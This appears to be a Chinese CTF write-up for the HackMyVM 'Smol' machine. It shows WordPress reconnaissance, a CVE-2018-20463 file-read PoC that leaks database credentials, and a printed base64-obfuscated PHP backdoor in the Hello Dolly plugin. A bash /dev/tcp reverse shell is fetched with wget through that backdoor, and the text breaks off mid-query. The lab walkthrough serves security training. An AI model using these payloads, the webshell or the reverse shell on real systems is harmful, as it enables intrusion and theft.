{"pageProps":{"postData":{"id":"HackMyVMSmol","contentHtml":"<h1>Smol.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Smol\">https://hackmyvm.eu/machines/machine.php?vm=Smol</a></p>\n</blockquote>\n<p>Notes: <strong>I hope you will enjoy it.</strong></p>\n<h2>信息收集</h2>\n<pre><code class=\"hljs language-python\">nmap -sP <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.0</span>/<span class=\"hljs-number\">24</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-02-05 01:<span class=\"hljs-number\">24</span> EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.1</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00030</span>s latency).\nMAC Address: 0A:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.2</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00024</span>s latency).\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:4C:6C:<span class=\"hljs-number\">28</span> (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00031</span>s latency).\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">75</span>:EE:3F (Oracle VirtualBox virtual NIC)\n</code></pre>\n<pre><code class=\"hljs language-python\">nmap -sT -<span class=\"hljs-built_in\">min</span>-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-02-05 01:<span class=\"hljs-number\">25</span> EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00039</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">75</span>:EE:3F (Oracle VirtualBox virtual NIC)\n</code></pre>\n<pre><code class=\"hljs language-python\">nmap -sT -sV -A -T4 <span class=\"hljs-number\">80</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span>  \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-02-05 01:<span class=\"hljs-number\">55</span> EST\nNmap scan report <span class=\"hljs-keyword\">for</span> www.smol.hmv (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span>)\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00044</span>s latency).\nNot shown: <span class=\"hljs-number\">998</span> closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh     OpenSSH <span class=\"hljs-number\">8.2</span>p1 Ubuntu 4ubuntu0<span class=\"hljs-number\">.9</span> (Ubuntu Linux; protocol <span class=\"hljs-number\">2.0</span>)\n| ssh-hostkey: \n|   <span class=\"hljs-number\">3072</span> <span class=\"hljs-number\">44</span>:5f:<span class=\"hljs-number\">26</span>:<span class=\"hljs-number\">67</span>:4b:4a:<span class=\"hljs-number\">91</span>:9b:<span class=\"hljs-number\">59</span>:7a:<span class=\"hljs-number\">95</span>:<span class=\"hljs-number\">59</span>:c8:4c:2e:04 (RSA)\n|   <span class=\"hljs-number\">256</span> 0a:4b:b9:b1:<span class=\"hljs-number\">77</span>:d2:<span class=\"hljs-number\">48</span>:<span class=\"hljs-number\">79</span>:fc:2f:8a:3d:<span class=\"hljs-number\">64</span>:3a:ad:<span class=\"hljs-number\">94</span> (ECDSA)\n|_  <span class=\"hljs-number\">256</span> d3:3b:<span class=\"hljs-number\">97</span>:ea:<span class=\"hljs-number\">54</span>:bc:<span class=\"hljs-number\">41</span>:4d:03:<span class=\"hljs-number\">39</span>:f6:8f:ad:b6:a0:fb (ED25519)\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http    Apache httpd <span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.41</span> ((Ubuntu))\n|_http-generator: WordPress <span class=\"hljs-number\">6.3</span>\n|_http-server-header: Apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.41</span> (Ubuntu)\n|_http-title: AnotherCTF\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">75</span>:EE:3F (Oracle VirtualBox virtual NIC)\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux <span class=\"hljs-number\">4.</span>X|<span class=\"hljs-number\">5.</span>X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5</span>\nOS details: Linux <span class=\"hljs-number\">4.15</span> - <span class=\"hljs-number\">5.8</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n<span class=\"hljs-number\">1</span>   <span class=\"hljs-number\">0.44</span> ms www.smol.hmv (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span>)\n</code></pre>\n<pre><code class=\"hljs language-python\">nmap -script=vuln -p- <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span>   \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-02-05 01:<span class=\"hljs-number\">27</span> EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00042</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp ports (reset)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http\n|_http-csrf: Couldn<span class=\"hljs-string\">'t find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn'</span>t find <span class=\"hljs-built_in\">any</span> DOM based XSS.\n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.\nMAC Address: 08:00:27:75:EE:3F (Oracle VirtualBox virtual NIC)\n</span></code></pre>\n<h2>渗透</h2>\n<p>优先级 <code>80</code> > <code>22</code></p>\n<h3>web 渗透</h3>\n<p>访问一下<code>web</code>页面（需要修改一下<code>hosts</code>文件，把域名指向靶机<code>IP</code>）</p>\n<p>通过<code>Wappalyzer</code>可以看到是用<code>WordPress 6.3</code>搭建的</p>\n<p><img src=\"/post-images/HackMyVMSmol/image48.png\" alt=\"image.png\"></p>\n<h3>WPScan</h3>\n<p>因为是使用WordPress搭建的，就可以使用<code>WPScan</code> 来扫描了</p>\n<pre><code class=\"hljs language-python\">wpscan --url http://www.smol.hmv -eu                                                                                                                     \n_______________________________________________________________               \n         __          _______   _____                                          \n         \\ \\        / /  __ \\ / ____|                                         \n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®                        \n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | <span class=\"hljs-string\">'_ \\                                                                                                        \n            \\  /\\  /  | |     ____) | (__| (_| | | | |                                                                                                       \n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|    \n                                                                                                                                                             \n         WordPress Security Scanner by the WPScan Team                        \n                         Version 3.8.27                                      \n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart                        \n_______________________________________________________________               \n                                                                              \n[+] URL: http://www.smol.hmv/ [192.168.56.16]         \n[+] Started: Wed Feb  5 02:12:38 2025                                         \n                                                                              \nInteresting Finding(s):                                                       \n                                                                                                                                                             \n[+] Headers                                                                                                                                                  \n | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)                          \n | Found By: Headers (Passive Detection)\n | Confidence: 100%                                                           \n                                                                              \n[+] XML-RPC seems to be enabled: http://www.smol.hmv/xmlrpc.php      \n | Found By: Direct Access (Aggressive Detection)             \n | Confidence: 100%                                                                                                                                          \n | References:                                                                \n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/                                \n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/                                                                       \n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/                                                                    \n                                                                              \n[+] WordPress readme found: http://www.smol.hmv/readme.html                   \n | Found By: Direct Access (Aggressive Detection)                             \n | Confidence: 100%                                                           \n                                                                                                                                                             \n[+] Upload directory has listing enabled: http://www.smol.hmv/wp-content/uploads/                                                                            \n | Found By: Direct Access (Aggressive Detection)         \n | Confidence: 100%                                                                                                                                          \n                                                                              \n[+] The external WP-Cron seems to be enabled: http://www.smol.hmv/wp-cron.php \n | Found By: Direct Access (Aggressive Detection)                             \n | Confidence: 60%                                                            \n | References:                                                                \n |  - https://www.iplocation.net/defend-wordpress-from-ddos                   \n |  - https://github.com/wpscanteam/wpscan/issues/1299                        \n                                                                              \n[+] WordPress version 6.3 identified (Insecure, released on 2023-08-08).      \n | Found By: Rss Generator (Passive Detection)                                \n |  - http://www.smol.hmv/index.php/feed/, &#x3C;generator>https://wordpress.org/?v=6.3&#x3C;/generator>                                                               \n |  - http://www.smol.hmv/index.php/comments/feed/, &#x3C;generator>https://wordpress.org/?v=6.3&#x3C;/generator>                                                      \n                                                                              \n[+] WordPress theme in use: popularfx                                         \n | Location: http://www.smol.hmv/wp-content/themes/popularfx/                 \n | Last Updated: 2024-11-19T00:00:00.000Z                                     \n | Readme: http://www.smol.hmv/wp-content/themes/popularfx/readme.txt\n | [!] The version is out of date, the latest version is 1.2.6                \n | Style URL: http://www.smol.hmv/wp-content/themes/popularfx/style.css?ver=1.2.5                                                                            \n | Style Name: PopularFX                                                      \n | Style URI: https://popularfx.com                                           \n | Description: Lightweight theme to make beautiful websites with Pagelayer. Includes 100s of pre-made templates to ...                                      \n | Author: Pagelayer                     \n | Author URI: https://pagelayer.com                                                                                                                         \n |                                                                                                                                                           \n | Found By: Css Style In Homepage (Passive Detection)                        \n |                                                                            \n | Version: 1.2.5 (80% confidence)                                            \n | Found By: Style (Passive Detection)                                        \n |  - http://www.smol.hmv/wp-content/themes/popularfx/style.css?ver=1.2.5, Match: '</span>Version: <span class=\"hljs-number\">1.2</span><span class=\"hljs-number\">.5</span><span class=\"hljs-string\">'                                                           \n                                                                                                                                                             \n[+] Enumerating Users (via Passive and Aggressive Methods)\n Brute Forcing Author IDs - Time: 00:00:00 &#x3C;===============================================================================> (10 / 10) 100.00% Time: 00:00:00\n                                                                              \n[i] User(s) Identified:                                                       \n                                                                              \n[+] think                                                                     \n | Found By: Author Posts - Author Pattern (Passive Detection)                \n | Confirmed By:                                                              \n |  Wp Json Api (Aggressive Detection)                                        \n |   - http://www.smol.hmv/index.php/wp-json/wp/v2/users/?per_page=100&#x26;page=1 \n |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)           \n |  Login Error Messages (Aggressive Detection)                               \n                                                                                                                                                             \n[+] wp                                                                                                                                                       \n | Found By: Author Posts - Author Pattern (Passive Detection)                \n | Confirmed By:                                                              \n |  Wp Json Api (Aggressive Detection)                                        \n |   - http://www.smol.hmv/index.php/wp-json/wp/v2/users/?per_page=100&#x26;page=1 \n |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)  \n                                                                              \n[+] Jose Mario Llado Marti                                                                                                                                   \n | Found By: Rss Generator (Passive Detection)                                \n                                                                              \n[+] wordpress user                                                                                                                                           \n | Found By: Rss Generator (Passive Detection)  \n[+] admin                                                                                                                                                    \n | Found By: Wp Json Api (Aggressive Detection)                               \n |  - http://www.smol.hmv/index.php/wp-json/wp/v2/users/?per_page=100&#x26;page=1  \n | Confirmed By:                                                              \n |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)           \n |  Login Error Messages (Aggressive Detection)                                                                                                              \n                                                                                                                                                             \n[+] gege                                                                      \n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)                                                                                 \n | Confirmed By: Login Error Messages (Aggressive Detection)                  \n                                                                              \n[+] diego                                                                     \n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)  \n | Confirmed By: Login Error Messages (Aggressive Detection)                  \n                                                                              \n[+] xavi                                                                      \n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)  \n | Confirmed By: Login Error Messages (Aggressive Detection)                  \n\n[i] Plugin(s) Identified:                                                     \n                                                                              \n[+] jsmol2wp                                                                  \n | Location: http://www.smol.hmv/wp-content/plugins/jsmol2wp/                 \n | Latest Version: 1.07 (up to date)                                          \n | Last Updated: 2018-03-09T10:28:00.000Z             \n |                                     \n | Found By: Urls In Homepage (Passive Detection)                             \n |                                                                            \n | Version: 1.07 (100% confidence)                                                                                                                           \n | Found By: Readme - Stable Tag (Aggressive Detection)                                                                                                      \n |  - http://www.smol.hmv/wp-content/plugins/jsmol2wp/readme.txt              \n | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)            \n |  - http://www.smol.hmv/wp-content/plugins/jsmol2wp/readme.txt \n                                                                              \n[!] No WPScan API Token given, as a result vulnerability data has not been output.                                                                           \n[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register                                                        \n                                                                              \n[+] Finished: Wed Feb  5 02:12:41 2025                                        \n[+] Requests Done: 65                                                         \n[+] Cached Requests: 6                                                        \n[+] Data Sent: 17.352 KB                                                      \n[+] Data Received: 372.886 KB                                                 \n[+] Memory used: 184.168 MB                                                                                                                                  \n[+] Elapsed time: 00:00:02           \n</span></code></pre>\n<p><code>WordPress</code>版本和之前扫描的一样，扫描出一个插件<code>jsmol2wp</code> ，到互联网上找一下漏洞</p>\n<h3>jsmol2wp 利用</h3>\n<blockquote>\n<p><a href=\"https://cn-sec.com/archives/1247521.html\">https://cn-sec.com/archives/1247521.html</a></p>\n</blockquote>\n<p>在网上找到一个该插件的任意文件读取漏洞 <strong>CVE-2018-20463</strong></p>\n<p>影响范围：WordPress JSmol2WP Plugin 1.07</p>\n<pre><code class=\"hljs language-python\">POC:\nhttp://localhost/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&#x26;call=getRawDataFromDatabase&#x26;query=php://<span class=\"hljs-built_in\">filter</span>/resource=../../../../wp-config.php\n</code></pre>\n<p><img src=\"/post-images/HackMyVMSmol/image49.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-python\">/** Database username */\ndefine( <span class=\"hljs-string\">'DB_USER'</span>, <span class=\"hljs-string\">'wpuser'</span> );\n\n/** Database password */\ndefine( <span class=\"hljs-string\">'DB_PASSWORD'</span>, <span class=\"hljs-string\">'kbLSF2Vop#lw3rjDZ629*Z%G'</span> );\n</code></pre>\n<p>拿到数据库用户名密码，尝试登陆<code>WordPress</code> ，登陆成功</p>\n<p><img src=\"/post-images/HackMyVMSmol/image50.png\" alt=\"image.png\"></p>\n<h3>WordPress 利用</h3>\n<p>尝试了下在新建文章里面执行<code>PHP</code>代码，但是不成功，模板的方法反弹<code>shell</code>需要管理员用户才能进行</p>\n<p>然后在控制面板的<code>Dashboard</code>里面可以找到一个私人的<code>page</code> ，是管理员的任务清单</p>\n<p><img src=\"/post-images/HackMyVMSmol/image51.png\" alt=\"image.png\"></p>\n<p>会发现他们在说关于后门的插件的事情， “<code>Hello Dolly</code> ”插件</p>\n<p><img src=\"/post-images/HackMyVMSmol/image52.png\" alt=\"image.png\"></p>\n<h3>扫描网站目录</h3>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~]                                                                                                                                          \n└─<span class=\"hljs-comment\"># dirsearch -u http://www.smol.hmv -x 403 -e php,zip,txt</span>\n[02:<span class=\"hljs-number\">26</span>:<span class=\"hljs-number\">38</span>] Starting:                                                                                                                                         \n[02:<span class=\"hljs-number\">26</span>:<span class=\"hljs-number\">52</span>] <span class=\"hljs-number\">301</span> -    0B  - /index.php  ->  http://www.smol.hmv/                                                                                               \n[02:<span class=\"hljs-number\">26</span>:<span class=\"hljs-number\">52</span>] <span class=\"hljs-number\">404</span> -   19KB - /index.php/login/                                                                                                                  \n[02:<span class=\"hljs-number\">26</span>:<span class=\"hljs-number\">54</span>] <span class=\"hljs-number\">200</span> -    7KB - /license.txt                                                                                                                       \n[02:<span class=\"hljs-number\">26</span>:<span class=\"hljs-number\">59</span>] <span class=\"hljs-number\">200</span> -    3KB - /readme.html                                                                                                                       \n[02:<span class=\"hljs-number\">27</span>:06] <span class=\"hljs-number\">301</span> -  315B  - /wp-admin  ->  http://www.smol.hmv/wp-admin/                                                                                       \n[02:<span class=\"hljs-number\">27</span>:06] <span class=\"hljs-number\">400</span> -    1B  - /wp-admin/admin-ajax.php                                                                                                           \n[02:<span class=\"hljs-number\">27</span>:06] <span class=\"hljs-number\">302</span> -    0B  - /wp-admin/  ->  http://www.smol.hmv/wp-login.php?redirect_to=http%3A%2F%2Fwww.smol.hmv%2Fwp-admin%2F&#x26;reauth=<span class=\"hljs-number\">1</span>                      \n[02:<span class=\"hljs-number\">27</span>:06] <span class=\"hljs-number\">200</span> -    0B  - /wp-config.php                                                                                                                     \n[02:<span class=\"hljs-number\">27</span>:06] <span class=\"hljs-number\">200</span> -  495B  - /wp-admin/install.php                                                                                                              \n[02:<span class=\"hljs-number\">27</span>:06] <span class=\"hljs-number\">500</span> -    3KB - /wp-admin/setup-config.php                                                                                                         \n[02:<span class=\"hljs-number\">27</span>:06] <span class=\"hljs-number\">200</span> -    0B  - /wp-content/ \n[02:<span class=\"hljs-number\">27</span>:07] <span class=\"hljs-number\">200</span> -   84B  - /wp-content/plugins/akismet/akismet.php                                                                                            \n[02:<span class=\"hljs-number\">27</span>:07] <span class=\"hljs-number\">500</span> -    0B  - /wp-content/plugins/hello.php                                                                                                      \n[02:<span class=\"hljs-number\">27</span>:07] <span class=\"hljs-number\">200</span> -  521B  - /wp-content/uploads/                                                                                                               \n[02:<span class=\"hljs-number\">27</span>:07] <span class=\"hljs-number\">200</span> -  414B  - /wp-content/upgrade/                                                                                                               \n[02:<span class=\"hljs-number\">27</span>:07] <span class=\"hljs-number\">301</span> -  318B  - /wp-includes  ->  http://www.smol.hmv/wp-includes/                                                                                 \n[02:<span class=\"hljs-number\">27</span>:07] <span class=\"hljs-number\">200</span> -    0B  - /wp-includes/rss-functions.php                                                                                                     \n[02:<span class=\"hljs-number\">27</span>:07] <span class=\"hljs-number\">200</span> -    0B  - /wp-cron.php                                                                                                                       \n[02:<span class=\"hljs-number\">27</span>:07] <span class=\"hljs-number\">200</span> -    2KB - /wp-login.php                                                                                                                      \n[02:<span class=\"hljs-number\">27</span>:07] <span class=\"hljs-number\">302</span> -    0B  - /wp-signup.php  ->  http://www.smol.hmv/wp-login.php?action=register                                                               \n[02:<span class=\"hljs-number\">27</span>:07] <span class=\"hljs-number\">200</span> -    4KB - /wp-includes/\n</code></pre>\n<h3>hello.php 插件利用</h3>\n<p>可以发现在插件目录存在<code>hello.php</code>文件，我们使用任意文件读取漏洞读取一下</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># /wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&#x26;call=getRawDataFromDatabase&#x26;query=php://filter/resource=../../../../wp-content/plugins/hello.php</span>\n\n&#x3C;?php\n/**\n * @package Hello_Dolly\n * @version <span class=\"hljs-number\">1.7</span><span class=\"hljs-number\">.2</span>\n */\n/*\nPlugin Name: Hello Dolly\nPlugin URI: http://wordpress.org/plugins/hello-dolly/\nDescription: This <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> just a plugin, it symbolizes the hope <span class=\"hljs-keyword\">and</span> enthusiasm of an entire generation summed up <span class=\"hljs-keyword\">in</span> two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric <span class=\"hljs-keyword\">from</span> &#x3C;cite>Hello, Dolly&#x3C;/cite> <span class=\"hljs-keyword\">in</span> the upper right of your admin screen on every page.\nAuthor: Matt Mullenweg\nVersion: <span class=\"hljs-number\">1.7</span><span class=\"hljs-number\">.2</span>\nAuthor URI: http://ma.tt/\n*/\n\nfunction hello_dolly_get_lyric() {\n\t/** These are the lyrics to Hello Dolly */\n\t$lyrics = <span class=\"hljs-string\">\"Hello, Dolly\nWell, hello, Dolly\nIt's so nice to have you back where you belong\nYou're lookin' swell, Dolly\nI can tell, Dolly\nYou're still glowin', you're still crowin'\nYou're still goin' strong\nI feel the room swayin'\nWhile the band's playin'\nOne of our old favorite songs from way back when\nSo, take her wrap, fellas\nDolly, never go away again\nHello, Dolly\nWell, hello, Dolly\nIt's so nice to have you back where you belong\nYou're lookin' swell, Dolly\nI can tell, Dolly\nYou're still glowin', you're still crowin'\nYou're still goin' strong\nI feel the room swayin'\nWhile the band's playin'\nOne of our old favorite songs from way back when\nSo, golly, gee, fellas\nHave a little faith in me, fellas\nDolly, never go away\nPromise, you'll never go away\nDolly'll never go away again\"</span>;\n\n\t// Here we split it into lines.\n\t$lyrics = explode( <span class=\"hljs-string\">\"\\n\"</span>, $lyrics );\n\n\t// And then randomly choose a line.\n\t<span class=\"hljs-keyword\">return</span> wptexturize( $lyrics[ mt_rand( <span class=\"hljs-number\">0</span>, count( $lyrics ) - <span class=\"hljs-number\">1</span> ) ] );\n}\n\n// This just echoes the chosen line, we<span class=\"hljs-string\">'ll position it later.\nfunction hello_dolly() {\n\teval(base64_decode('</span>CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=<span class=\"hljs-string\">'));\n\t\n\t$chosen = hello_dolly_get_lyric();\n\t$lang   = '</span><span class=\"hljs-string\">';\n\tif ( '</span>en_<span class=\"hljs-string\">' !== substr( get_user_locale(), 0, 3 ) ) {\n\t\t$lang = '</span> lang=<span class=\"hljs-string\">\"en\"</span><span class=\"hljs-string\">';\n\t}\n\n\tprintf(\n\t\t'</span>&#x3C;p <span class=\"hljs-built_in\">id</span>=<span class=\"hljs-string\">\"dolly\"</span>>&#x3C;span <span class=\"hljs-keyword\">class</span>=<span class=\"hljs-string\">\"screen-reader-text\"</span>>%s &#x3C;/span>&#x3C;span <span class=\"hljs-built_in\">dir</span>=<span class=\"hljs-string\">\"ltr\"</span>%s>%s&#x3C;/span>&#x3C;/p><span class=\"hljs-string\">',\n\t\t__( '</span>Quote <span class=\"hljs-keyword\">from</span> Hello Dolly song, by Jerry Herman:<span class=\"hljs-string\">' ),\n\t\t$lang,\n\t\t$chosen\n\t);\n}\n\n// Now we set that function up to execute when the admin_notices action is called.\nadd_action( '</span>admin_notices<span class=\"hljs-string\">', '</span>hello_dolly<span class=\"hljs-string\">' );\n\n// We need some CSS to position the paragraph.\nfunction dolly_css() {\n\techo \"\n\t&#x3C;style type='</span>text/css<span class=\"hljs-string\">'>\n\t#dolly {\n\t\tfloat: right;\n\t\tpadding: 5px 10px;\n\t\tmargin: 0;\n\t\tfont-size: 12px;\n\t\tline-height: 1.6666;\n\t}\n\t.rtl #dolly {\n\t\tfloat: left;\n\t}\n\t.block-editor-page #dolly {\n\t\tdisplay: none;\n\t}\n\t@media screen and (max-width: 782px) {\n\t\t#dolly,\n\t\t.rtl #dolly {\n\t\t\tfloat: none;\n\t\t\tpadding-left: 0;\n\t\t\tpadding-right: 0;\n\t\t}\n\t}\n\t&#x3C;/style>\n\t\";\n}\n\nadd_action( '</span>admin_head<span class=\"hljs-string\">', '</span>dolly_css<span class=\"hljs-string\">' );\n</span></code></pre>\n<p>可以看到就是提到的插件，其中有令人在意的内容</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-built_in\">eval</span>(base64_decode(<span class=\"hljs-string\">'CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='</span>));\n</code></pre>\n<p>将<code>base64</code>解码后得到：</p>\n<pre><code class=\"hljs language-python\"> <span class=\"hljs-keyword\">if</span> (isset($_GET[<span class=\"hljs-string\">\"\\143\\155\\x64\"</span>])) { system($_GET[<span class=\"hljs-string\">\"\\143\\x6d\\144\"</span>]); } \n</code></pre>\n<p>实际上就是</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-keyword\">if</span> (isset($_GET[<span class=\"hljs-string\">\"cmd\"</span>])) { system($_GET[<span class=\"hljs-string\">\"cmd\"</span>]); } \n</code></pre>\n<p>最后，插件通过 <code>add_action('admin_notices', 'hello_dolly');</code> 将 <code>hello_dolly()</code> 函数绑定到 <code>admin_notices</code> 钩子。这意味着只要进入 WordPress 的后台页面，就会自动调用 <code>hello_dolly()</code> 函数，在页面右上角显示一段随机歌词</p>\n<p><img src=\"/post-images/HackMyVMSmol/image53.png\" alt=\"image.png\"></p>\n<p>那么我们在后台页面进行测试，成功读取文件</p>\n<p><img src=\"/post-images/HackMyVMSmol/image54.png\" alt=\"image.png\"></p>\n<h3>反弹shell</h3>\n<p>不能直接进行反弹，我们需要通过创建传递恶意文件，再通过后门来执行</p>\n<ol>\n<li>\n<p>创建恶意文件<code>shell.sh</code>（反弹<code>shell</code>使用）</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># shell.sh</span>\n/<span class=\"hljs-built_in\">bin</span>/bash -c <span class=\"hljs-string\">'bash -i >&#x26; /dev/tcp/192.168.56.4/4444 0>&#x26;1'</span>\n</code></pre>\n</li>\n<li>\n<p>然后开启<code>http</code>服务器</p>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~/Desktop/test/SMOL]\n└─<span class=\"hljs-comment\"># php -S 0:80  </span>\n[Wed Feb  <span class=\"hljs-number\">5</span> 04:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">25</span> <span class=\"hljs-number\">2025</span>] PHP <span class=\"hljs-number\">8.2</span><span class=\"hljs-number\">.24</span> Development Server (http://<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">80</span>) started\n</code></pre>\n</li>\n<li>\n<p>然后通过后门读取文件然后保存到临时文件夹</p>\n<pre><code class=\"hljs language-python\">http://www.smol.hmv/wp-admin/index.php?cmd=wget <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>/shell.sh -O /tmp/shell.sh\n</code></pre>\n</li>\n<li>\n<p><code>kali</code>开启监听</p>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~]\n└─<span class=\"hljs-comment\"># nc -lvp 4444</span>\nlistening on [<span class=\"hljs-built_in\">any</span>] <span class=\"hljs-number\">4444</span> ...\n</code></pre>\n</li>\n<li>\n<p>最后通过后门来执行刚刚保存的文件</p>\n<pre><code class=\"hljs language-python\">http://www.smol.hmv/wp-admin/index.php?cmd=/<span class=\"hljs-built_in\">bin</span>/bash /tmp/shell.sh\n</code></pre>\n</li>\n<li>\n<p>最终得到<code>shell</code></p>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~]\n└─<span class=\"hljs-comment\"># nc -lvp 4444  </span>\nlistening on [<span class=\"hljs-built_in\">any</span>] <span class=\"hljs-number\">4444</span> ...\nconnect to [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>] <span class=\"hljs-keyword\">from</span> www.smol.hmv [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span>] <span class=\"hljs-number\">42818</span>\nbash: cannot <span class=\"hljs-built_in\">set</span> terminal process group (<span class=\"hljs-number\">788</span>): Inappropriate ioctl <span class=\"hljs-keyword\">for</span> device\nbash: no job control <span class=\"hljs-keyword\">in</span> this shell\nwww-data@smol:/var/www/wordpress/wp-admin$ \n</code></pre>\n<pre><code class=\"hljs language-python\">mysql> select * <span class=\"hljs-keyword\">from</span> wp_users;\nselect * <span class=\"hljs-keyword\">from</span> 